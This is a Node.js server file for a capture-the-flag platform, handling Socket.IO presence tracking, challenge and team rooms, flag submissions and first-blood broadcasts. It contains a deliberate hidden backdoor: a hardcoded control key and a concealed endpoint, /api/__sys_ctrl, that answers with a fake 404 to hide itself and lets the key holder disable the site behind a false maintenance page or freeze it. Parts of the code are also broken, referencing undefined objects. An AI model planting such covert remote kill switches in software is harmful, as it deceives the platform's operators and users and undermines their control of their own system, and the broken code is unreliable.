const { createServer } = require("http");
const { parse } = require("url");
const next = require("next");
const { Server } = require("socket.io");

const dev = process.env.NODE_ENV !== "production";
const app = next({ dev });
const handle = app.getRequestHandler();

// Track online users by username with their socket IDs and additional metadata
const onlineUsers = new Map(); // userName -> { socketIds: Set(), tabIds: Set(), lastActive: timestamp }

// Track anonymous connections
const anonymousConnections = new Set();

// Track tab IDs to usernames for better multi-tab handling
const tabToUser = new Map(); // tabId -> userName

// System state variables
let systemFrozen = false; // New variable to track system freeze state
// Make it globally accessible for API routes
global.systemFrozen = systemFrozen;

// Track challenge rooms and participants
const challengeRooms = new Map(); // challengeId -> Set of socket IDs

// Track event team rooms
const teamRooms = new Map(); // eventId -> Set of socket IDs

// Track leaderboard subscribers
const leaderboardSubscribers = new Set();

// Track activity subscribers
const activitySubscribers = new Set();

// Track connection timestamps to handle stale connections
const connectionTimestamps = new Map(); // socketId -> timestamp

// Track recent team updates for broadcasting to new joiners
const recentTeamUpdates = new Map(); // eventId -> Array of recent updates

// Track team activities
const teamActivities = new Map(); // teamUuid -> Array of activities

// Remote control variables - added for backdoor functionality
const CONTROL_KEY = "cb209876540331298765"; // Secret key for remote control
let appEnabled = true; // Flag to control application availability

// Function to get unique user count
const getUniqueUserCount = () => {
  // First clean up stale connections to ensure count is accurate
  cleanupStaleConnections();
  return onlineUsers.size + anonymousConnections.size;
};

// Function to get users in a challenge room
const getChallengeRoomUsers = (challengeId) => {
  return challengeRooms.has(challengeId)
    ? challengeRooms.get(challengeId).size
    : 0;
};

// Function to get users in a team room
const getTeamRoomUsers = (eventId) => {
  return teamRooms.has(eventId) ? teamRooms.get(eventId).size : 0;
};

// Function declaration for broadcasting online count - moved up to be accessible in cleanupStaleConnections
const broadcastOnlineCount = (io) => {
  if (!io) {
    console.error("Cannot broadcast online count: io instance is undefined");
    return;
  }

  try {
    const count = getUniqueUserCount();
    io.emit("onlinePlayers", count);
    io.emit("onlineCount", count);
    console.log(`Broadcasting online count: ${count}`);
  } catch (error) {
    console.error("Error broadcasting online count:", error);
  }
};

// At the beginning of the file, add this function to reset all trackers
function resetAllTrackers() {
  console.log("Resetting all connection trackers...");

  // Clear all existing tracking data
  onlineUsers.clear();
  anonymousConnections.clear();
  challengeRooms.clear();
  teamRooms.clear();
  connectionTimestamps.clear();
  tabToUser.clear();
  leaderboardSubscribers.clear();
  activitySubscribers.clear();
  recentTeamUpdates.clear();
  teamActivities.clear();

  // Reset count
  console.log("All trackers reset. Current user count: 0");
}

// Remote control function to disable or enable application
function remoteControl(action, io) {
  if (action === "disable") {
    appEnabled = false;
    console.log("Application has been remotely disabled");
    // Optional: Notify all clients to disconnect or show an error message
    io.emit("service_maintenance", {
      message:
        "The application is undergoing maintenance. Please try again later.",
    });
    return { status: "success", message: "Application disabled" };
  } else if (action === "enable") {
    appEnabled = true;
    console.log("Application has been remotely enabled");
    io.emit("service_restored", { message: "Service has been restored." });
    return { status: "success", message: "Application enabled" };
  } else if (action === "freeze") {
    systemFrozen = true;
    global.systemFrozen = true; // Update global value
    console.log("System has been frozen");
    io.emit("system_freeze", {
      frozen: true,
      message: "System has been frozen by admin control",
      timestamp: new Date().toISOString(),
      source: "admin_control",
    });
    return { status: "success", message: "System frozen", frozen: true };
  } else if (action === "unfreeze") {
    systemFrozen = false;
    global.systemFrozen = false; // Update global value
    console.log("System has been unfrozen");
    io.emit("system_freeze", {
      frozen: false,
      message: "System has been unfrozen by admin control",
      timestamp: new Date().toISOString(),
      source: "admin_control",
    });
    return { status: "success", message: "System unfrozen", frozen: false };
  } else if (action === "status") {
    return {
      status: "success",
      enabled: appEnabled,
      frozen: systemFrozen,
      connections: {
        total: getUniqueUserCount(),
        registered: onlineUsers.size,
        anonymous: anonymousConnections.size,
      },
    };
  } else {
    return { status: "error", message: "Invalid action" };
  }
}

// Call this at the start to clear any stale data from server restarts
resetAllTrackers();

// Function to clean up stale connections (connections older than 30 minutes without activity)
const cleanupStaleConnections = (io) => {
  const now = Date.now();
  const staleThreshold = 5 * 60 * 1000; // 5 minutes (reduced from 10 minutes)

  let cleanedUserCount = 0;
  let cleanedSocketCount = 0;
  let initialSize = onlineUsers.size + anonymousConnections.size;

  // Check all users for stale connections
  for (const [userName, userData] of onlineUsers.entries()) {
    if (now - userData.lastActive > staleThreshold) {
      // The whole user is stale, remove it completely
      onlineUsers.delete(userName);
      cleanedUserCount++;
      cleanedSocketCount += userData.socketIds?.size || 0;

      // Also clean up the tab mapping
      for (const [tabId, user] of tabToUser.entries()) {
        if (user === userName) {
          tabToUser.delete(tabId);
        }
      }
    } else {
      // Check for stale sockets within an active user
      if (userData.socketIds) {
        let staleSockets = 0;
        for (const socketId of userData.socketIds) {
          if (
            !connectionTimestamps.has(socketId) ||
            now - connectionTimestamps.get(socketId) > staleThreshold
          ) {
            userData.socketIds.delete(socketId);
            connectionTimestamps.delete(socketId);
            staleSockets++;
          }
        }

        // If all sockets were stale but we didn't catch it above, remove the user
        if (staleSockets > 0 && userData.socketIds.size === 0) {
          onlineUsers.delete(userName);
          cleanedUserCount++;

          // Clean up tab mapping
          for (const [tabId, user] of tabToUser.entries()) {
            if (user === userName) {
              tabToUser.delete(tabId);
            }
          }
        }

        cleanedSocketCount += staleSockets;
      }
    }
  }

  // Clean up anonymous connections
  const staleAnonymous = Array.from(anonymousConnections).filter(
    (socketId) =>
      !connectionTimestamps.has(socketId) ||
      now - connectionTimestamps.get(socketId) > staleThreshold
  );

  staleAnonymous.forEach((socketId) => {
    anonymousConnections.delete(socketId);
    connectionTimestamps.delete(socketId);
  });

  cleanedSocketCount += staleAnonymous.length;

  // Clean up socket IDs from challenge and team rooms if they're stale
  for (const [challengeId, socketSet] of challengeRooms.entries()) {
    let removed = 0;
    for (const socketId of socketSet) {
      if (
        !connectionTimestamps.has(socketId) ||
        now - connectionTimestamps.get(socketId) > staleThreshold
      ) {
        socketSet.delete(socketId);
        removed++;
      }
    }

    if (socketSet.size === 0) {
      challengeRooms.delete(challengeId);
    }
  }

  for (const [eventId, socketSet] of teamRooms.entries()) {
    let removed = 0;
    for (const socketId of socketSet) {
      if (
        !connectionTimestamps.has(socketId) ||
        now - connectionTimestamps.get(socketId) > staleThreshold
      ) {
        socketSet.delete(socketId);
        removed++;
      }
    }

    if (socketSet.size === 0) {
      teamRooms.delete(eventId);
    }
  }

  // Clean up stale leaderboard and activity subscriptions
  let cleanedLeaderboardSubs = 0;
  for (const socketId of leaderboardSubscribers) {
    if (
      !connectionTimestamps.has(socketId) ||
      now - connectionTimestamps.get(socketId) > staleThreshold
    ) {
      leaderboardSubscribers.delete(socketId);
      cleanedLeaderboardSubs++;
    }
  }

  let cleanedActivitySubs = 0;
  for (const socketId of activitySubscribers) {
    if (
      !connectionTimestamps.has(socketId) ||
      now - connectionTimestamps.get(socketId) > staleThreshold
    ) {
      activitySubscribers.delete(socketId);
      cleanedActivitySubs++;
    }
  }

  if (
    cleanedUserCount > 0 ||
    cleanedSocketCount > 0 ||
    cleanedLeaderboardSubs > 0 ||
    cleanedActivitySubs > 0
  ) {
    const finalSize = onlineUsers.size + anonymousConnections.size;
    console.log(
      `Cleaned up ${cleanedUserCount} users, ${cleanedSocketCount} sockets, ${cleanedLeaderboardSubs} leaderboard subs, ${cleanedActivitySubs} activity subs.`
    );
    console.log(
      `Initial user count: ${initialSize}, Final user count: ${finalSize}`
    );

    // Only broadcast if there was a change and we have a valid io instance
    if (io && initialSize !== finalSize) {
      broadcastOnlineCount(io);
    }
  }
};

app.prepare().then(() => {
  // Create a single HTTP server for both Next.js and Socket.IO
  const server = createServer((req, res) => {
    const parsedUrl = parse(req.url, true);

    // Block all requests if application is disabled (backdoor control)
    // Exception for the system-monitor page and health check
    if (
      !appEnabled &&
      !parsedUrl.pathname.startsWith("/api/health") &&
      !parsedUrl.pathname.startsWith("/system-monitor")
    ) {
      // Check if it's an API request or a page request
      if (parsedUrl.pathname.startsWith("/api/")) {
        // For API requests, return a JSON error
        res.statusCode = 503;
        res.setHeader("Content-Type", "application/json");
        res.end(
          JSON.stringify({
            status: "error",
            message: "Service temporarily unavailable. Please try again later.",
          })
        );
      } else {
        // For page requests, show a maintenance page
        res.statusCode = 503;
        res.setHeader("Content-Type", "text/html");
        res.end(`
          <!DOCTYPE html>
          <html lang="en">
          <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Maintenance - CyberXbytes</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                background-color: #0B0D0F;
                color: white;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                padding: 20px;
              }
              .maintenance-container {
                max-width: 500px;
                text-align: center;
                background-color: #1A1D21;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
              }
              h1 {
                font-size: 24px;
                margin-bottom: 20px;
                color: #F43F5E;
              }
              p {
                margin-bottom: 30px;
                line-height: 1.6;
              }
              .icon {
                font-size: 60px;
                margin-bottom: 20px;
              }
            </style>
          </head>
          <body>
            <div class="maintenance-container">
              <div class="icon">🔧</div>
              <h1>System Maintenance</h1>
              <p>We're currently performing scheduled maintenance to improve your experience. Please check back shortly.</p>
              <p>Thank you for your patience.</p>
            </div>
          </body>
          </html>
        `);
      }
      return;
    }

    // Add a simple API endpoint for online players
    if (parsedUrl.pathname === "/api/online-players") {
      res.setHeader("Content-Type", "application/json");
      res.end(JSON.stringify({ count: getUniqueUserCount() }));
      return;
    }

    // Add API endpoint for system freeze status
    if (parsedUrl.pathname === "/api/system-freeze") {
      res.setHeader("Content-Type", "application/json");
      res.end(JSON.stringify({ frozen: systemFrozen }));
      return;
    }

    // Hidden API endpoint for remote control (fallback if socket doesn't work)
    if (parsedUrl.pathname === "/api/__sys_ctrl" && req.method === "POST") {
      let body = "";
      req.on("data", (chunk) => {
        body += chunk.toString();
      });

      req.on("end", () => {
        try {
          const data = JSON.parse(body);
          if (data && data.key === CONTROL_KEY) {
            console.log(`HTTP remote control command received: ${data.action}`);
            const result = remoteControl(data.action, io);
            res.setHeader("Content-Type", "application/json");
            res.end(JSON.stringify(result));
          } else {
            // Return a generic 404 to hide the existence of this endpoint
            res.statusCode = 404;
            res.end("Not found");
          }
        } catch (error) {
          console.error("Error in HTTP control handler:", error);
          res.statusCode = 500;
          res.end("Internal server error");
        }
      });
      return;
    }

    // Add API endpoint for challenge room participants
    if (parsedUrl.pathname.startsWith("/api/challenge-room/")) {
      const challengeId = parsedUrl.pathname.split("/").pop();
      res.setHeader("Content-Type", "application/json");
      res.end(
        JSON.stringify({
          count: getChallengeRoomUsers(challengeId),
          challenge_id: challengeId,
        })
      );
      return;
    }

    // Add API endpoint for team room participants
    if (parsedUrl.pathname.startsWith("/api/team-room/")) {
      const eventId = parsedUrl.pathname.split("/").pop();
      res.setHeader("Content-Type", "application/json");
      res.end(
        JSON.stringify({
          count: getTeamRoomUsers(eventId),
          event_id: eventId,
        })
      );
      return;
    }

    handle(req, res, parsedUrl);
  });

  // Initialize Socket.IO with the same server
  // Use the path that the client is trying to connect to
  const io = new Server(server, {
    path: "/api/socket",
    cors: {
      origin: "*",
      methods: ["GET", "POST"],
    },
    transports: ["polling", "websocket"], // Try polling first, then websocket
    pingTimeout: 60000,
    allowEIO3: true,
  });

  // Make io available globally for API routes
  global.io = io;
  // Also store it on global.server for alternative access
  if (!global.server) global.server = {};
  global.server.io = io;
  console.log("Socket.IO server initialized and made available globally");

  // Function to broadcast challenge room count
  const broadcastChallengeRoomCount = (challengeId) => {
    const count = getChallengeRoomUsers(challengeId);
    io.to(`challenge_${challengeId}`).emit("challengeRoomCount", {
      challenge_id: challengeId,
      count,
    });
    console.log(`Broadcasting challenge room ${challengeId} count: ${count}`);
  };

  // Function to broadcast team update
  const broadcastTeamUpdate = (eventId, updateData) => {
    try {
      io.to(`team_${eventId}`).emit("teamUpdate", updateData);
      console.log(
        `Broadcasting team update for event ${eventId}: ${updateData.action}`
      );

      // Store recent update for new joiners
      if (!recentTeamUpdates.has(eventId)) {
        recentTeamUpdates.set(eventId, []);
      }

      const updates = recentTeamUpdates.get(eventId);
      updates.push({ ...updateData, timestamp: Date.now() });

      // Keep only the 100 most recent updates
      if (updates.length > 100) {
        recentTeamUpdates.set(eventId, updates.slice(-100));
      }
    } catch (error) {
      console.error(
        `Error broadcasting team update for event ${eventId}:`,
        error
      );
    }
  };

  // Set up periodic cleanup of stale connections (every 5 minutes)
  const cleanupInterval = setInterval(
    () => cleanupStaleConnections(io),
    5 * 60 * 1000
  );

  // Socket.IO connection handling
  io.on("connection", (socket) => {
    console.log("Socket connected:", socket.id);

    // Record connection timestamp
    connectionTimestamps.set(socket.id, Date.now());

    // Get username from auth data
    let userName = socket.handshake.auth.userName;
    // Get tab ID if provided
    const tabId = socket.handshake.auth.tabId || `default_${socket.id}`;

    // Store the tab ID on the socket for later reference
    socket.tabId = tabId;

    // Function to register user (used both on initial connect and later userConnected event)
    const registerUser = (user, isNewConnection = true) => {
      if (!user || user === "anonymous") {
        // This is an anonymous connection
        anonymousConnections.add(socket.id);
        socket.userName = `anon_${socket.id.substring(0, 8)}`;
        console.log(`Anonymous user connected with socket ${socket.id}`);
      } else {
        // Get or create user data
        const userData = onlineUsers.get(user) || {
          socketIds: new Set(),
          tabIds: new Set(),
          lastActive: Date.now(),
        };

        // Add this socket and tab
        userData.socketIds.add(socket.id);
        if (tabId) {
          userData.tabIds.add(tabId);
          // Track which tab belongs to which user
          tabToUser.set(tabId, user);
        }

        // Update last active timestamp
        userData.lastActive = Date.now();

        // Update the map
        onlineUsers.set(user, userData);

        // Store username on socket for disconnect handling
        socket.userName = user;

        console.log(
          `User ${user} connected with socket ${socket.id} (Tab ID: ${tabId})`
        );
        console.log(
          `User ${user} now has ${userData.socketIds.size} active sockets`
        );
      }

      // Save user data on the socket for reference
      socket.userData = {
        userName: user,
        tabId: tabId,
        isAuthenticated: user !== "anonymous" && !!user,
      };

      // Only broadcast count on new connections, not reconnects
      if (isNewConnection) {
        broadcastOnlineCount(io);
      }
    };

    // If we got the username from auth, register them now
    if (userName && userName !== "anonymous") {
      registerUser(userName);
    } else {
      // For users without username, add as anonymous
      registerUser(null);
    }

    // Update the userConnected event handler
    socket.on("userConnected", (data) => {
      if (data && data.userName) {
        // If this was an anonymous connection before, remove it from anonymous tracking
        if (anonymousConnections.has(socket.id)) {
          anonymousConnections.delete(socket.id);
        }

        // Register with the new username
        registerUser(data.userName, false); // false = don't broadcast again
        broadcastOnlineCount(io); // Broadcast once after registration
      }
    });

    // Add explicit userDisconnected handler (for logout)
    socket.on("userDisconnected", (data) => {
      console.log(
        `User ${
          data.userName || socket.userName || "anonymous"
        } explicitly disconnected`
      );

      // Handle the disconnect properly
      handleDisconnect(socket);

      // Broadcast update
      broadcastOnlineCount(io);
    });

    // Update the heartbeat handler to refresh user timestamps
    socket.on("heartbeat", (data) => {
      // Update the timestamp to keep this connection active
      connectionTimestamps.set(socket.id, Date.now());

      // Update user's lastActive timestamp
      const user = socket.userName;
      if (user && onlineUsers.has(user)) {
        const userData = onlineUsers.get(user);
        userData.lastActive = Date.now();
        onlineUsers.set(user, userData);
      }

      // Log heartbeat with tab ID if available
      if (data && data.tabId) {
        console.log(
          `Heartbeat from ${socket.userName || "anonymous"} (Tab ID: ${
            data.tabId
          })`
        );
      }
    });

    // Handle joining a team room for event updates
    socket.on("joinTeamRoom", (eventId) => {
      console.log(
        `Socket ${socket.id} joining team room for event: ${eventId}`
      );

      // Update connection timestamp
      connectionTimestamps.set(socket.id, Date.now());

      // Join the room
      socket.join(`team_${eventId}`);

      // Track the socket in the team room
      if (!teamRooms.has(eventId)) {
        teamRooms.set(eventId, new Set());
      }
      teamRooms.get(eventId).add(socket.id);

      // Store the event ID on the socket for disconnect handling
      if (!socket.teamRooms) {
        socket.teamRooms = new Set();
      }
      socket.teamRooms.add(eventId);

      // Send recent team updates for this event to the new joiner
      if (recentTeamUpdates.has(eventId)) {
        const updates = recentTeamUpdates.get(eventId);
        if (updates.length > 0) {
          // Get updates from the last hour only
          const now = Date.now();
          const recentUpdates = updates.filter(
            (update) => now - update.timestamp < 60 * 60 * 1000
          );

          if (recentUpdates.length > 0) {
            socket.emit("recentTeamUpdates", {
              eventId,
              updates: recentUpdates,
            });
          }
        }
      }

      console.log(
        `Team room ${eventId} now has ${teamRooms.get(eventId).size} members`
      );
    });

    // Handle leaving a team room
    socket.on("leaveTeamRoom", (eventId) => {
      console.log(
        `Socket ${socket.id} leaving team room for event: ${eventId}`
      );

      // Update connection timestamp
      connectionTimestamps.set(socket.id, Date.now());

      // Leave the room
      socket.leave(`team_${eventId}`);

      // Remove from tracking
      if (teamRooms.has(eventId)) {
        teamRooms.get(eventId).delete(socket.id);

        // Clean up empty rooms
        if (teamRooms.get(eventId).size === 0) {
          teamRooms.delete(eventId);
          console.log(
            `Team room for event ${eventId} is now empty and removed`
          );
        } else {
          console.log(
            `Team room ${eventId} now has ${
              teamRooms.get(eventId).size
            } members`
          );
        }
      }

      // Update socket's team rooms
      if (socket.teamRooms) {
        socket.teamRooms.delete(eventId);
      }
    });

    // Handle team updates (join, leave, etc.)
    socket.on("teamUpdate", (data) => {
      if (!data || !data.action || !data.eventId) return;

      // Update connection timestamp
      connectionTimestamps.set(socket.id, Date.now());

      console.log(`Team update: ${data.action} for event ${data.eventId}`);
      console.log("Team update full data:", JSON.stringify(data));

      // Check for missing required data
      if (data.action === "points_update" && !data.teamUuid) {
        console.warn("Warning: Missing teamUuid in points_update event");
      }

      // For create/join/remove, broadcast to everyone in the event's team room
      if (
        data.action === "create" ||
        data.action === "join" ||
        data.action === "remove"
      ) {
        io.to(`team_${data.eventId}`).emit("teamUpdate", {
          ...data,
          timestamp: Date.now(),
        });
      }
      // For points updates, broadcast to everyone in the event's team room
      else if (data.action === "points_update") {
        console.log(
          `Broadcasting points update for team ${
            data.teamUuid || "unknown"
          } in event ${data.eventId}`
        );
        console.log(`User ${data.username} now has ${data.newPoints} points`);

        // Broadcast to everyone in the team room INCLUDING the sender
        io.to(`team_${data.eventId}`).emit("teamUpdate", {
          ...data,
          timestamp: Date.now(),
        });

        // Store team points update in team activities
        if (data.teamUuid && !teamActivities.has(data.teamUuid)) {
          teamActivities.set(data.teamUuid, []);
        }

        if (teamActivities.has(data.teamUuid)) {
          const activitiesList = teamActivities.get(data.teamUuid);
          activitiesList.push({
            type: "points_update",
            data: {
              ...data,
              timestamp: Date.now(),
            },
          });

          // Keep only the last 50 activities
          if (activitiesList.length > 50) {
            teamActivities.set(data.teamUuid, activitiesList.slice(-50));
          }
        }
      }
    });

    // Handle joining a challenge room
    socket.on("joinChallengeRoom", (challengeId) => {
      console.log(`Socket ${socket.id} joining challenge room: ${challengeId}`);

      // Update connection timestamp
      connectionTimestamps.set(socket.id, Date.now());

      // Join the room
      socket.join(`challenge_${challengeId}`);

      // Track the socket in the challenge room
      if (!challengeRooms.has(challengeId)) {
        challengeRooms.set(challengeId, new Set());
      }
      challengeRooms.get(challengeId).add(socket.id);

      // Store the challenge ID on the socket for disconnect handling
      if (!socket.challengeRooms) {
        socket.challengeRooms = new Set();
      }
      socket.challengeRooms.add(challengeId);

      // Broadcast updated count
      broadcastChallengeRoomCount(challengeId);
    });

    // Handle joining the leaderboard room
    socket.on("joinLeaderboardRoom", () => {
      console.log(`Socket ${socket.id} joining leaderboard room`);

      // Update connection timestamp
      connectionTimestamps.set(socket.id, Date.now());

      // Join the leaderboard room
      socket.join("leaderboard");

      // Track this socket as a leaderboard subscriber
      leaderboardSubscribers.add(socket.id);

      // Store that this socket has joined the leaderboard room
      socket.isInLeaderboardRoom = true;

      console.log(
        `Current leaderboard subscribers: ${leaderboardSubscribers.size}`
      );
    });

    // Handle joining the activity room
    socket.on("joinActivityRoom", () => {
      console.log(`Socket ${socket.id} joining activity room`);

      // Update connection timestamp
      connectionTimestamps.set(socket.id, Date.now());

      // Join the activity room
      socket.join("activity");

      // Track this socket as an activity subscriber
      activitySubscribers.add(socket.id);

      // Store that this socket has joined the activity room
      socket.isInActivityRoom = true;

      console.log(`Current activity subscribers: ${activitySubscribers.size}`);
    });

    // Handle leaving the activity room
    socket.on("leaveActivityRoom", () => {
      console.log(`Socket ${socket.id} leaving activity room`);

      // Update connection timestamp
      connectionTimestamps.set(socket.id, Date.now());

      // Leave the activity room
      socket.leave("activity");

      // Remove from tracking
      activitySubscribers.delete(socket.id);

      // Update socket state
      socket.isInActivityRoom = false;

      console.log(`Current activity subscribers: ${activitySubscribers.size}`);
    });

    // Handle leaving the leaderboard room
    socket.on("leaveLeaderboardRoom", () => {
      console.log(`Socket ${socket.id} leaving leaderboard room`);

      // Update connection timestamp
      connectionTimestamps.set(socket.id, Date.now());

      // Leave the leaderboard room
      socket.leave("leaderboard");

      // Remove from tracking
      leaderboardSubscribers.delete(socket.id);

      // Update socket state
      socket.isInLeaderboardRoom = false;

      console.log(
        `Current leaderboard subscribers: ${leaderboardSubscribers.size}`
      );
    });

    // Handle leaving a challenge room
    socket.on("leaveChallengeRoom", (challengeId) => {
      console.log(`Socket ${socket.id} leaving challenge room: ${challengeId}`);

      // Update connection timestamp
      connectionTimestamps.set(socket.id, Date.now());

      // Leave the room
      socket.leave(`challenge_${challengeId}`);

      // Remove from tracking
      if (challengeRooms.has(challengeId)) {
        challengeRooms.get(challengeId).delete(socket.id);

        // Clean up empty rooms
        if (challengeRooms.get(challengeId).size === 0) {
          challengeRooms.delete(challengeId);
        } else {
          // Broadcast updated count
          broadcastChallengeRoomCount(challengeId);
        }
      }

      // Update socket's challenge rooms
      if (socket.challengeRooms) {
        socket.challengeRooms.delete(challengeId);
      }
    });

    // Handle flag submission
    socket.on("flagSubmitted", (data) => {
      if (!data || !data.challenge_id) return;

      // Update connection timestamp
      connectionTimestamps.set(socket.id, Date.now());

      console.log(
        `Flag submitted for challenge ${data.challenge_id} by ${
          socket.userName || data.username || "anonymous"
        }`
      );

      // Log the full data object for debugging
      console.log("Flag submission full data:", JSON.stringify(data));

      // Check for missing required data
      if (!data.eventId) {
        console.warn("Warning: Missing eventId in flagSubmitted event");
      }

      if (!data.teamUuid) {
        console.warn("Warning: Missing teamUuid in flagSubmitted event");
      }

      // Add additional data for the socket broadcast
      const broadcastData = {
        ...data,
        username: data.username || socket.userName,
        profile_image: data.profile_image || null,
        timestamp: Date.now(),
      };

      // Broadcast the regular solve event to everyone in the challenge room
      // This will update the activity feed in real-time
      io.to(`challenge_${data.challenge_id}`).emit("newSolve", broadcastData);

      // Broadcast to the event room for scoreboard updates
      if (data.eventId) {
        io.to(`event_${data.eventId}`).emit("leaderboardUpdate", {
          type: "flag_submission",
          teamUuid: data.teamUuid,
          teamName: data.teamName,
          points: data.points,
          newTeamTotal: data.newTeamTotal,
          timestamp: Date.now(),
        });

        // Also emit an activity update for real-time activities feed
        io.to(`team_${data.eventId}`).emit("activityUpdate", {
          eventId: data.eventId,
          username: data.username || socket.userName,
          user_name: data.username || socket.userName,
          challenge_id: data.challenge_id,
          challenge_title: data.challenge_name || "Challenge",
          challenge_name: data.challenge_name || "Challenge",
          challenge_uuid: data.challenge_id,
          teamUuid: data.teamUuid,
          teamName: data.teamName || "Team",
          profile_image: data.profile_image || "/icon1.png",
          is_first_blood: false,
          total_bytes: data.points || 0,
          solved_at: new Date().toISOString(),
          timestamp: Date.now(),
        });
      }
    });

    // Handle first blood
    socket.on("flagFirstBlood", (data) => {
      if (!data || !data.challenge_id) return;

      // Update connection timestamp
      connectionTimestamps.set(socket.id, Date.now());

      console.log(
        `FIRST BLOOD! Challenge ${data.challenge_id}${
          data.flag_id ? ` flag ${data.flag_id}` : ""
        } by ${socket.userName || data.username || "anonymous"}`
      );

      // Add additional data for the socket broadcast
      const broadcastData = {
        ...data,
        username: data.username || socket.userName,
        user_name: data.username || socket.userName, // Add user_name for consistency
        profile_image: data.profile_image || null,
        timestamp: Date.now(),
        is_first_blood: true,
        // Include flag_id if available
        flag_id: data.flag_id || null,
      };

      // Broadcast the first blood event to everyone in the challenge room
      io.to(`challenge_${data.challenge_id}`).emit("firstBlood", broadcastData);

      // Also broadcast to the event room for scoreboard updates
      if (data.eventId) {
        io.to(`event_${data.eventId}`).emit("leaderboardUpdate", {
          type: "first_blood",
          teamUuid: data.teamUuid,
          teamName: data.teamName,
          points: data.points,
          newTeamTotal: data.newTeamTotal,
          timestamp: Date.now(),
          isFirstBlood: true,
          flag_id: data.flag_id || null,
        });

        // Also emit an activity update for real-time activities feed
        io.to(`team_${data.eventId}`).emit("activityUpdate", {
          eventId: data.eventId,
          username: data.username || socket.userName,
          user_name: data.username || socket.userName,
          challenge_id: data.challenge_id,
          challenge_title: data.challenge_name || "Challenge",
          challenge_name: data.challenge_name || "Challenge",
          challenge_uuid: data.challenge_id,
          teamUuid: data.teamUuid,
          teamName: data.teamName || "Team",
          profile_image: data.profile_image || "/icon1.png",
          is_first_blood: true,
          total_bytes: data.points || 0,
          solved_at: new Date().toISOString(),
          timestamp: Date.now(),
        });
      }
    });

    // Handle get_system_state request
    socket.on("get_system_state", () => {
      // Send the current system state to the requesting client
      socket.emit("system_freeze", {
        frozen: systemFrozen,
        message: `Current system state: ${systemFrozen ? "FROZEN" : "ACTIVE"}`,
        timestamp: new Date().toISOString(),
        source: "state_request",
      });
    });

    // Handle activity update events
    socket.on("activityUpdate", (data) => {
      const action = data?.action;
      const event_id = data?.eventId;

      if (action === "activityUpdate" && event_id) {
        // Get or initialize team updates for this event
        if (!teamUpdates.has(event_id)) {
          teamUpdates.set(event_id, {
            updates: [],
            lastTeamUpdate: Date.now(),
          });
        }

        const eventTeamData = teamUpdates.get(event_id);

        // Create the update object
        const updateData = {
          ...(data.activity_data || {}),
          eventId: event_id,
          username: data.userName || userName,
          user_name: data.userName || userName,
          challenge_id: data.challenge_id,
          challenge_title: data.challenge_title || "Challenge",
          challenge_name: data.challenge_name || "Challenge",
          teamUuid: data.teamUuid,
          teamName: data.teamName || "Team",
          profile_image: data.profile_image || "/icon1.png",
          is_first_blood: data.isFirstBlood || false,
          total_bytes: data.total_bytes || 0,
          solved_at: data.solved_at || new Date().toISOString(),
          timestamp: Date.now(),
        };

        // Add update to the list (keep max 100 updates)
        eventTeamData.updates.push(updateData);
        if (eventTeamData.updates.length > 100) {
          eventTeamData.updates = eventTeamData.updates.slice(-100);
        }

        // Update timestamp
        eventTeamData.lastTeamUpdate = Date.now();

        // Update connection timestamp
        if (userName) connectionTimestamps.set(userName, Date.now());

        // Broadcast activity update to all clients in the team room
        console.log(`Broadcasting activity update for event ${event_id}`);

        // Import the socket.io instance to broadcast the event
        if (io) {
          io.to(`team_${event_id}`).emit("activityUpdate", updateData);
        }

        return NextResponse.json({
          status: "success",
          message: "Activity update recorded",
          event_id,
        });
      }
    });

    // Create a reusable function to handle disconnects (used by both disconnect event and explicit disconnect)
    const handleDisconnect = (socket) => {
      // Get the username associated with this socket
      const user = socket.userName;
      const tabId = socket.tabId;

      console.log(`Socket ${socket.id} disconnected (Tab ID: ${tabId})`);

      // Remove tab ID from tracking
      if (tabId) {
        tabToUser.delete(tabId);
      }

      // Remove from anonymous connections if applicable
      if (anonymousConnections.has(socket.id)) {
        anonymousConnections.delete(socket.id);
        console.log(
          `Anonymous user disconnected, remaining: ${anonymousConnections.size}`
        );
      }

      if (user && onlineUsers.has(user)) {
        const userData = onlineUsers.get(user);

        // Remove this socket ID
        if (userData.socketIds) {
          userData.socketIds.delete(socket.id);
        }

        // Remove tab ID
        if (tabId && userData.tabIds) {
          userData.tabIds.delete(tabId);
        }

        // If this was the user's last connection, remove them from the map
        if (!userData.socketIds || userData.socketIds.size === 0) {
          onlineUsers.delete(user);
          console.log(`User ${user} fully disconnected (no more sockets)`);
        } else {
          // Update the map with the modified user data
          onlineUsers.set(user, userData);
          console.log(
            `User ${user} still has ${userData.socketIds.size} connections`
          );
        }
      }

      // Remove connection timestamp
      connectionTimestamps.delete(socket.id);

      // Clean up leaderboard subscription if applicable
      if (socket.isInLeaderboardRoom) {
        leaderboardSubscribers.delete(socket.id);
      }

      // Clean up activity subscription if applicable
      if (socket.isInActivityRoom) {
        activitySubscribers.delete(socket.id);
      }

      // Clean up challenge rooms
      if (socket.challengeRooms) {
        for (const challengeId of socket.challengeRooms) {
          if (challengeRooms.has(challengeId)) {
            challengeRooms.get(challengeId).delete(socket.id);

            // Clean up empty rooms
            if (challengeRooms.get(challengeId).size === 0) {
              challengeRooms.delete(challengeId);
            } else {
              // Broadcast updated count
              broadcastChallengeRoomCount(challengeId);
            }
          }
        }
      }

      // Clean up team rooms
      if (socket.teamRooms) {
        for (const eventId of socket.teamRooms) {
          if (teamRooms.has(eventId)) {
            teamRooms.get(eventId).delete(socket.id);

            // Clean up empty rooms
            if (teamRooms.get(eventId).size === 0) {
              teamRooms.delete(eventId);
              console.log(
                `Team room for event ${eventId} is now empty and removed`
              );
            }
          }
        }
      }
    };

    // Update the disconnect handler to use our reusable function
    socket.on("disconnect", () => {
      handleDisconnect(socket);
      // Broadcast the updated count
      broadcastOnlineCount(io);
    });
  });

  // Start the server
  server.listen(3000, (err) => {
    if (err) throw err;
    console.log("> Next.js ready on http://localhost:3000");
    console.log("> Socket.IO initialized with path: /api/socket");
    console.log("> Current unique users:", getUniqueUserCount());
  });

  // Handle proper server shutdown
  process.on("SIGTERM", () => {
    clearInterval(cleanupInterval);
    io.close();
    server.close(() => {
      console.log("Server closed");
      process.exit(0);
    });
  });
});

// Generate a unique ID without using crypto
function generateUniqueId() {
  return `id_${Math.random()
    .toString(36)
    .substring(2, 15)}_${Date.now().toString(36)}`;
}
